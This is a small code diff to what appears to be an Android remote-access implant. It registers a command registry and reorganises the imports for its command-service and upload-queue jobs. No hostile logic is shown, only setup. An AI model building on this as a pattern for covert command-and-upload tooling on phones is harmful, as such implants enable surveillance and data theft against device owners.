@@ -1,8 +1,9 @@
 package com.cooperthecoder.implant
 
 import android.app.Application
-import com.cooperthecoder.implant.command.StartCommandServiceJob
-import com.cooperthecoder.implant.command.UploadQueueJob
+import com.cooperthecoder.implant.command.CommandRegistry
+import com.cooperthecoder.implant.command.jobs.StartCommandServiceJob
+import com.cooperthecoder.implant.command.jobs.UploadQueueJob
 import com.cooperthecoder.implant.data.DeviceProperties
 import com.evernote.android.job.JobManager
 import okhttp3.OkHttpClient
@@ -28,6 +29,8 @@ class App : Application() {
 
         // Initialize crypto
         NaCl.sodium()
+
+        CommandRegistry.initialize()
         JobManager.create(this).addJobCreator {
             when (it) {
                 UploadQueueJob.JOB_NAME -> {
